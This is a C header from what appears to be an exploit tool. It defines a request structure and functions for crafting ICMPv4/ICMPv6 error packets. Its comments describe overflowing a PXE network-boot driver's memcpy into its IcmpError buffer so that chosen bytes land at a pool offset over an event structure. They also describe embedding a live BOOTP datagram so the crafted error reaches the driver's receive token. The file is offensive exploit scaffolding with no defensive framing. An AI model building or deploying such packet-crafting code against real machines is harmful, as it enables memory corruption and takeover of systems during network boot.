#ifndef CRAFT_H
#define CRAFT_H

#include <stdint.h>
#include <stddef.h>

/* One packet, one primitive.  `overflow` is everything the driver's memcpy
 * writes past the end of Mode->IcmpError, starting at &IcmpError + off.
 * Offsets inside it are therefore both packet offsets AND the byte offsets
 * that land at (pool_base + off + i).  That identity is the whole trick. */
typedef struct {
  uint32_t src, dst;            /* outer IPv4 */
  uint8_t  src6[16], dst6[16];  /* outer IPv6 */
  uint8_t  icmp_type, icmp_code;

  /* Live datagram to embed, so the IP layer hands the error to the PXE
   * driver's armed Udp4/Udp6 receive token instead of dropping it. */
  uint32_t embed_src, embed_dst;
  uint16_t embed_sport, embed_dport;
  uint8_t  embed_data[8];       /* BOOTP header, incl. the real xid */
  const uint8_t *embed_v6_hdr;
  size_t   embed_v6_hdr_len;

  size_t   off;                 /* == GRAFT_EVENT_OFF */
  const uint8_t *overflow;
  size_t   overflow_len;
} craft_req_t;

size_t craft_icmp4(uint8_t *out, size_t cap, const craft_req_t *rq);
size_t craft_icmp6(uint8_t *out, size_t cap, const craft_req_t *rq);
void   craft_seed(uint32_t s);

#endif
